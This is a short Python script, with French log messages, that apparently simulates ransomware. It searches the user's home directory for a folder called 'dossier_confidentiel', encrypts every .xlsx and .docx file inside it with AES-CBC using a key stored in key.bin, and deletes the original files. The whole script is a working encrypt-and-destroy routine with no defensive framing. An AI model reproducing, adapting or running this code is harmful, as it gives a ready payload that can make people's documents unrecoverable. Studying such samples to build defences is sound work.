import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

key_path = "key.bin"
if not os.path.exists(key_path):
    with open(key_path, "wb") as f:
        key = get_random_bytes(32)
        f.write(key)
else:
    with open(key_path, "rb") as f:
        key = f.read()

def encrypt_file(file_path, output_path, key):
    with open(file_path, "rb") as f:
        data = f.read()  
    
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    
    with open(output_path, "wb") as f:
        f.write(cipher.iv + ciphertext)

def find_confidential_folder(base_path, folder_name="dossier_confidentiel"):
    for root, dirs, files in os.walk(base_path):
        if folder_name in dirs:
            return os.path.join(root, folder_name)
    return None

def encrypt_all_files_in_folder(folder_path, extensions, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                file_path = os.path.join(root, file)
                encrypted_path = f"{file_path}.enc"
                print(f"Chiffrement du fichier {file_path}...")
                encrypt_file(file_path, encrypted_path, key)
                print(f"Fichier chiffré : {encrypted_path}")
                
                try:
                    os.remove(file_path)
                    print(f"Fichier original supprimé : {file_path}")
                except Exception as e:
                    print(f"Erreur lors de la suppression du fichier {file_path}: {e}")

def encrypt_main():
    user_home = os.path.expanduser("~")
    confidential_folder = find_confidential_folder(user_home)

    if confidential_folder:
        print(f"Dossier 'dossier_confidentiel' trouvé : {confidential_folder}")
        file_extensions = [".xlsx", ".docx"]
        encrypt_all_files_in_folder(confidential_folder, file_extensions, key)
    else:
        print("Dossier 'dossier_confidentiel' introuvable.")
